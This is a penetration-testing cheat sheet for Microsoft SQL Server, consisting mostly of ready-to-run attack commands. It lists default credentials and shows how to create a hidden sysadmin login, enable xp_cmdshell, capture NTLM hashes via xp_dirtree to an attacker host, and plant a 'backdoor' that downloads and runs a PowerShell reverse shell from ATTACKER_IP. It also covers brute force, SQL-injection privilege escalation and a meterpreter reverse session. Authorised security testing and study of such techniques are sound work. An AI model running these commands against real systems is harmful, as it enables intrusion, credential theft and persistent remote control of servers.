# 1. Pentest MS SQL server

MSSQL default port: `1433/tcp` and `1434/tcp`

**Summery:**

- [1. Pentest MS SQL server](#1-pentest-ms-sql-server)
- [2. Recon](#2-recon)
  - [2.1. Information Gathering](#21-information-gathering)
    - [2.1.1. Default login](#211-default-login)
    - [2.1.2. Default Databases](#212-default-databases)
- [3. Client](#3-client)
- [4. Queries](#4-queries)
  - [4.1. User info](#41-user-info)
  - [4.2. Databases](#42-databases)
  - [4.3. xp_cmdshell](#43-xp_cmdshell)
    - [4.3.1 Enable xp_cmdshell](#431-enable-xp_cmdshell)
    - [4.3.2 Execute command](#432-execute-command)
  - [4.4. NTLM Service Hash gathering](#44-ntlm-service-hash-gathering)
  - [4.5. User impersonation](#45-user-impersonation)
  - [4.6. Exploit Trusted Links](#46-exploit-trusted-links)
  - [4.7. Backdoor](#47-backdoor)
- [5. Attack with tools](#5-attack-with-tools)
  - [5.1. Login brute force](#51-login-brute-force)
  - [5.2. SQLi - Priv esc with metasploit](#52-sqli---priv-esc-with-metasploit)
    - [5.2.1. Escalate dbowner sqli](#521-escalate-dbowner-sqli)
    - [5.2.2. mssql_escalate_execute_as_sqli](#522-mssql_escalate_execute_as_sqli)
  - [6. CrackMapExec](#6-crackmapexec)
  - [7. Metasploit - Remote session](#7-metasploit---remote-session)
- [8. Sources](#8-sources)

# 2. Recon

## 2.1. Information Gathering  

Nmap:

```bash
nmap -p 1433 -sV -sC --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-tables,ms-sql-empty-password TARGET_IP
```

Metasploit:

```ruby
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS TARGET_IP
run
```

### 2.1.1. Default login

|Version|Username|Password|
|:-------|:-------|:-------|
|SQL Server 2008/R2|sa| [blank password] |
|SQL Server 201x|sa| Password123 |

### 2.1.2. Default Databases

```text
[*] master
[*] model
[*] msdb
[*] tempdb
```

# 3. Client

sqsh:

```ruby
sqsh -S TARGET_IP -U USERNAME -P PASSWORD
```

mssqlclient:

```ruby
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP'
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP' -db DATABASE
```

# 4. Queries

## 4.1. User info

List users

```sql
SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

List users and Hashs

```sql
SELECT name, password_hash FROM master.sys.sql_logins;
```

List sysadmin users

```sql
SELECT loginname FROM syslogins WHERE sysadmin = 1;
```

Create user

```sql
EXEC master..sp_addlogin hacker, secret;
```

Create user with sysadmin privs

```sql
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
```

Login as the newly created user

```sql
ALTER LOGIN hacker ENABLE ;
GO
ALTER LOGIN hacker WITH PASSWORD = 'P@ssword123!';
GO
```

Check current user priv

```sql
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('dbcreator');
SELECT is_srvrolemember('bulkadmin');
SELECT is_srvrolemember('diskadmin');
SELECT is_srvrolemember('processadmin');
SELECT is_srvrolemember('serveradmin');
SELECT is_srvrolemember('setupadmin');
SELECT is_srvrolemember('securityadmin');
```

## 4.2. Databases

> Show trustworthy databases

```sql
SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
```

> Set database as trustworthy

```sql
ALTER DATABASE DatabaseName SET TRUSTWORTHY ON;
```

> Manual

```sql
SELECT name FROM master.dbo.sysdatabases #Get databases;
SELECT table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES; #Get tables names;
SELECT table_catalog,table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.columns; #Get columns names;
```

## 4.3. xp_cmdshell

### 4.3.1 Enable xp_cmdshell

Turn on advanced options and is needed to configure xp_cmdshell:

```sql
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
```

Enables xp_cmdshell:

```sql
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
```

### 4.3.2 Execute command

```powershell
xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'whoami';
EXEC master.dbo.xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami';
```

## 4.4. NTLM Service Hash gathering

```sql
xp_dirtree '\\ATTACKER_IP\any\thing';
EXEC master.dbo.xp_dirtree '\\ATTACKER_IP\any\thing';
EXEC master..xp_dirtree '\\ATTACKER_IP\any\thing';
```

## 4.5. User impersonation

List users that can be impersonated

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Impersonating user

> Check current user

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

> Impersonate user

```sql
EXECUTE AS LOGIN = 'sa';
```

> Check if successfully impersonate user

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## 4.6. Exploit Trusted Links

List trusted links

```sql
select * from master..sysservers;
```

Execute query on the server

```sql
SELECT * from OPENQUERY ("ServerName",'select @@version');
```

## 4.7. Backdoor

```sql
EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/rev.ps1") | powershell -noprofile';
```

# 5. Attack with tools

## 5.1. Login brute force

```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS TARGET_IP
set user_file /root/Desktop/user.txt
set pass_file /root/Desktop/pass.txt
run
```

## 5.2. SQLi - Priv esc with metasploit

### 5.2.1. Escalate dbowner sqli

```ruby
use auxiliary/admin/mssql/mssql_escalate_dbowner_sqli
set DATA destination='+and+1=[SQLi];--&password=1
set GET_PATH '/index.php'
set METHOD POST 
set RHOSTS TARGET_IP
set RPORT 80
```

### 5.2.2. mssql_escalate_execute_as_sqli

```ruby
use admin/mssql/mssql_escalate_execute_as_sqli
set DATA destination='+and+1=[SQLi];--&password=1
set GET_PATH '/index.php'
set METHOD POST 
set RHOSTS TARGET_IP
set RPORT 80
```

## 6. CrackMapExec

Test connection

```sh
cme mssql TARGET_IP -u 'USERNAME' -p 'PASSWORD'
cme mssql TARGET_IP -u 'USERNAME' -p 'PASSWORD' -a normal
```

Run command

```sh
cme mssql TARGET_IP -u 'USERNAME' -p 'PASSWORD' -a normal -x 'whoami'
```

## 7. Metasploit - Remote session

```ruby
use exploit/windows/mssql/mssql_payload
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS TARGET_IP
set LHOST L_IP_ADDRESS
set LPORT L_PORT
```

# 8. Sources

- <https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server>
- <http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/>
- <https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/>
- <https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/>
- <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>
- <https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/>>xp-cmdshell-server-configuration-option?view=sql-server-ver15>
